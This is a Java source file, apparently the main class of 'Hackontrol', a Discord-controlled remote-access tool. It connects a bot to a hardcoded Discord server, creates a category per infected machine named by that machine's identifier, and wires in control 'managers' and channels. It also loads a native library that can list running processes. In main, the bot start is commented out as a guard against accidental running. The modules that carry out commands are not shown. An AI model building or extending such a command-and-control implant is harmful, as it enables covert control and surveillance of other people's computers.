package com.khopan.hackontrol;

import java.lang.Thread.UncaughtExceptionHandler;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import com.khopan.hackontrol.manager.Manager;
import com.khopan.hackontrol.registration.ChannelRegistry;
import com.khopan.hackontrol.registration.ManagerRegistry;
import com.khopan.hackontrol.registry.RegistrationHandler;
import com.khopan.hackontrol.registry.RegistryType;
import com.khopan.hackontrol.registry.implementation.StrictClassValueOnlyRegistryImplementation;
import com.khopan.hackontrol.utils.ErrorHandler;

import net.dv8tion.jda.api.JDA;
import net.dv8tion.jda.api.JDABuilder;
import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.entities.MessageHistory;
import net.dv8tion.jda.api.entities.channel.concrete.Category;
import net.dv8tion.jda.api.entities.channel.concrete.TextChannel;
import net.dv8tion.jda.api.entities.channel.middleman.MessageChannel;
import net.dv8tion.jda.api.requests.GatewayIntent;

public class Hackontrol {
	public static final RegistryType<Void, Class<? extends Manager>> MANAGER_REGISTRY;
	public static final RegistryType<Void, Class<? extends HackontrolChannel>> CHANNEL_REGISTRY;

	public static final Logger LOGGER;

	private static Hackontrol INSTANCE;

	static {
		NativeLibrary.load();
		MANAGER_REGISTRY = RegistryType.create();
		CHANNEL_REGISTRY = RegistryType.create();
		LOGGER = LoggerFactory.getLogger("Hackontrol");
	}

	private final UncaughtExceptionHandler defaultHandler;
	private final List<Manager> managerList;
	private final List<HackontrolChannel> channelList;
	private final RegistrationHandler registrationHandler;
	private final JDA bot;
	private final Guild guild;
	private final String machineIdentifier;
	private final Category category;

	private ErrorHandler handler;

	private Hackontrol() {
		Hackontrol.INSTANCE = this;
		this.defaultHandler = Thread.getDefaultUncaughtExceptionHandler();
		Thread.setDefaultUncaughtExceptionHandler(this :: handleError);
		StrictClassValueOnlyRegistryImplementation<Manager> managerRegistryImplementation = StrictClassValueOnlyRegistryImplementation.create(Hackontrol.MANAGER_REGISTRY, Manager.class);
		ManagerRegistry.register(managerRegistryImplementation);
		this.managerList = managerRegistryImplementation.getList();
		StrictClassValueOnlyRegistryImplementation<HackontrolChannel> channelRegistryImplementation = StrictClassValueOnlyRegistryImplementation.create(Hackontrol.CHANNEL_REGISTRY, HackontrolChannel.class);
		ChannelRegistry.register(channelRegistryImplementation);
		this.channelList = channelRegistryImplementation.getList();

		for(int i = 0; i < this.channelList.size(); i++) {
			HackontrolChannel channel = this.channelList.get(i);
			Hackontrol.LOGGER.info("Registered channel: {}", channel.getClass().getName());
		}

		this.registrationHandler = new RegistrationHandler();
		JDABuilder builder = JDABuilder.createDefault(Token.BOT_TOKEN).enableIntents(GatewayIntent.MESSAGE_CONTENT);

		for(int i = 0; i < this.managerList.size(); i++) {
			this.managerList.get(i).configureBuilder(builder);
		}

		this.bot = builder.build();

		try {
			this.bot.awaitReady();
		} catch(Throwable Errors) {
			throw new RuntimeException();
		}

		this.guild = this.bot.getGuildById(1173967259304198154L);
		this.machineIdentifier = Machine.getIdentifier();
		this.category = this.getOrCreateCategory(this.guild, this.machineIdentifier);

		for(int i = 0; i < this.channelList.size(); i++) {
			HackontrolChannel channel = this.channelList.get(i);
			TextChannel textChannel = this.getOrCreateTextChannelInCategory(this.category, channel.getName());
			channel.hackontrol = this;
			channel.category = this.category;
			channel.channel = textChannel;
			channel.preInitialize(this.registrationHandler.createRegistry(channel));

			if(this.isChannelEmpty(textChannel)) {
				Hackontrol.LOGGER.info("Channel #{} empty", textChannel.getName());
				channel.initialize();
			}

			channel.postInitialize();
		}

		for(int i = 0; i < this.managerList.size(); i++) {
			Manager manager = this.managerList.get(i);
			Hackontrol.LOGGER.info("Initializing manager: {}", manager.getClass().getName());
			manager.initialize(this.registrationHandler);
		}
	}

	private Category getOrCreateCategory(Guild guild, String name) {
		List<Category> list = guild.getCategoriesByName(name, true);

		if(list.isEmpty()) {
			return guild.createCategory(name).complete();
		}

		return list.get(0);
	}

	private TextChannel getOrCreateTextChannelInCategory(Category category, String name) {
		List<TextChannel> list = category.getTextChannels();
		boolean hasChannel = false;
		TextChannel targetChannel = null;

		for(int i = 0; i < list.size(); i++) {
			TextChannel channel = list.get(i);

			if(channel.getName().equalsIgnoreCase(name)) {
				hasChannel = true;
				targetChannel = channel;
				break;
			}
		}

		if(hasChannel) {
			return targetChannel;
		}

		return category.createTextChannel(name).complete();
	}

	private boolean isChannelEmpty(MessageChannel channel) {
		MessageHistory history = MessageHistory.getHistoryFromBeginning(channel).complete();
		return history.getRetrievedHistory().isEmpty();
	}

	private void handleError(Thread thread, Throwable Errors) {
		if(this.handler == null) {
			this.defaultHandler.uncaughtException(thread, Errors);
			return;
		}

		Hackontrol.LOGGER.warn("Uncaught Exception: {}", Errors.toString());
		this.handler.errorOccured(thread, Errors);
	}

	public List<Manager> getManagerList() {
		return Collections.unmodifiableList(this.managerList);
	}

	@SuppressWarnings("unchecked")
	public <T extends Manager> T getManager(Class<T> managerClass) {
		if(managerClass == null) {
			throw new NullPointerException("Manager class cannot be null");
		}

		for(int i = 0; i < this.managerList.size(); i++) {
			Manager manager = this.managerList.get(i);

			if(managerClass.isAssignableFrom(manager.getClass())) {
				return (T) manager;
			}
		}

		return null;
	}

	public List<HackontrolChannel> getChannelList() {
		return Collections.unmodifiableList(this.channelList);
	}

	@SuppressWarnings("unchecked")
	public <T extends HackontrolChannel> T getChannel(Class<T> channelClass) {
		if(channelClass == null) {
			throw new NullPointerException("Channel class cannot be null");
		}

		for(int i = 0; i < this.channelList.size(); i++) {
			HackontrolChannel channel = this.channelList.get(i);

			if(channelClass.isAssignableFrom(channel.getClass())) {
				return (T) channel;
			}
		}

		return null;
	}

	public HackontrolChannel getChannel(TextChannel textChannel) {
		if(textChannel == null) {
			throw new NullPointerException("Text channel cannot be null");
		}

		for(int i = 0; i < this.channelList.size(); i++) {
			HackontrolChannel channel = this.channelList.get(i);

			if(textChannel.equals(channel.channel)) {
				return channel;
			}
		}

		return null;
	}

	public RegistrationHandler getRegistrationHandler() {
		return this.registrationHandler;
	}

	public JDA getBot() {
		return this.bot;
	}

	public Guild getGuild() {
		return this.guild;
	}

	public String getMachineIdentifier() {
		return this.machineIdentifier;
	}

	public Category getCategory() {
		return this.category;
	}

	public ErrorHandler getErrorHandler() {
		return this.handler;
	}

	public void setErrorHandler(ErrorHandler handler) {
		this.handler = handler;
	}

	public static void main(String[] args) throws Throwable {
		//NativeLibrary.critical(true); Prevent accidentally running the code
		/*HackontrolLoggerConfig.disableDebug();
		Hackontrol.LOGGER.info("Initializing");
		Hackontrol.getInstance();*/
		System.out.println("Current: " + NativeLibrary.currentIdentifier());
		List<ProcessEntry> processList = new ArrayList<>();
		processList.addAll(List.of(NativeLibrary.listProcess()));
		processList.sort((x, y) -> x.executableFile.compareToIgnoreCase(y.executableFile));

		if(processList == null || processList.isEmpty()) {
			return;
		}

		for(int i = 0; i < processList.size(); i++) {
			ProcessEntry process = processList.get(i);
			System.out.println(process.executableFile + " " + process.processIdentifier);
		}
	}

	public static Hackontrol getInstance() {
		if(Hackontrol.INSTANCE == null) {
			Hackontrol.INSTANCE = new Hackontrol();
		}

		return Hackontrol.INSTANCE;
	}
}
